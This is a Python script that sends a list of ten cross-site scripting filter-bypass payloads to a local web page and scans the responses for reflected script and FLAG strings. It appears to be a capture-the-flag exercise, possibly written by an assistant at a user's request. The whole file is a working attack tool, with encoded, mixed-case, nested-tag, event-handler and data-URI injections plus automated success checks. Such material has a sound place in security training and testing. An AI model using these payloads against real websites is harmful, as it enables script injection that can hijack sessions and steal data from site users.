import requests
import urllib.parse
import re

# Target URL
base_url = "http://127.0.0.1:33203/page"

# XSS payload variations to test
payloads_to_test = [
    # User-requested variations:
    ("HTML entity encoding", "<svg onload=alert(&#39;XSS&#39;)>", "html_entity"),
    ("URL encoded", "%3Csvg%20onload%3Dalert(%27XSS%27)%3E", "url_encoded"),
    ("Mixed case tags", "<SVG ONLOAD=alert('XSS')>", "mixed_case"),
    ("Nested tags", "<svg><svg onload=alert('XSS')>", "nested"),
    ("Slash syntax", "<svg/onload=alert('XSS')>", "slash_syntax"),
    ("Whitespace before =", "<svg onload = alert('XSS')>", "whitespace_eq"),
    ("Multiple spaces", "<svg onload=     alert('XSS')>", "multi_space"),
    ("Onmouseover", "<svg onmouseover=alert('XSS')>", "onmouseover"),
    ("Onclick", "<svg onclick=alert('XSS')>", "onclick"),
    ("Data URI iframe", '<iframe src="data:text/html,<script>alert(\'XSS\')</script>">', "data_uri"),
]

print("[*] XSS Filter Bypass Testing Results")
print("=" * 80)

results = []
for test_name, payload, technique in payloads_to_test:
    try:
        params = {'name': payload}
        response = requests.get(base_url, params=params, timeout=10)
        
        status_code = response.status_code
        length = len(response.content)
        text = response.text
        
        payload_reflected = payload in text
        decoded_reflected = urllib.parse.unquote(payload) in text
        has_alert_single = "alert('XSS')" in text
        has_alert_double = 'alert("XSS")' in text
        flags = re.findall(r'FLAG\{[^}]+\}', text)
        
        behavior = "UNKNOWN"
        if 'new_star.png' in text:
            behavior = "FILTERED"
        elif 'error_star.png' in text:
            behavior = "ERROR"
        elif flags:
            behavior = "SUCCESS"
        
        print(f"[+] {test_name:25} | {behavior:8}")
        print(f"    Payload: {payload[:60]}")
        print(f"    Status: {status_code} | Length: {length} | Reflected: {payload_reflected}")
        
        if flags:
            print(f"    [!] FLAG: {flags}")
        
        results.append({
            'name': test_name,
            'payload': payload,
            'behavior': behavior,
            'reflected': payload_reflected,
            'decoded_reflected': decoded_reflected,
            'alert_single': has_alert_single,
            'alert_double': has_alert_double,
            'flags': flags
        })
        
    except Exception as e:
        print(f"[ERROR] {test_name}: {str(e)}")

print("\n[*] SUMMARY:")
filtered = sum(1 for r in results if r['behavior'] == 'FILTERED')
errors = sum(1 for r in results if r['behavior'] == 'ERROR')
success = sum(1 for r in results if r['behavior'] == 'SUCCESS')

print(f"Total tested: {len(payloads_to_test)}")
print(f"Filtered: {filtered}")
print(f"Validation errors: {errors}")
print(f"Success/Flags: {success}")

all_flags = [flag for r in results for flag in r['flags']]
if all_flags:
    print(f"\n[!!] FLAGS FOUND: {all_flags}")
else:
    print("\n[ ] No flags found in responses")
